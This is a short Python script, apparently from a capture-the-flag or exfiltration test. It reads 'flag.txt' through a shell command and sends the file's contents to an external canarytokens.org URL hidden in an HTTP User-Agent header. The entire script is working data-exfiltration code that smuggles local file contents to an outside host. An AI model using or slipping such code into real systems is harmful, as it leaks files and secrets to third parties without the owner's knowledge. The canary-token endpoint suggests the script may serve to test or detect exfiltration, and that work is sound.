import subprocess
from urllib.request import urlopen, Request
x = subprocess.Popen('cat flag.txt', shell=True, stdout=subprocess.PIPE).stdout.read().decode()
url = "http://canarytokens.org/about/traffic/zi550h5whfx5fnkz9j2dkjsgd/submit.aspx"
urlopen(Request(url, headers={'User-Agent': x}))
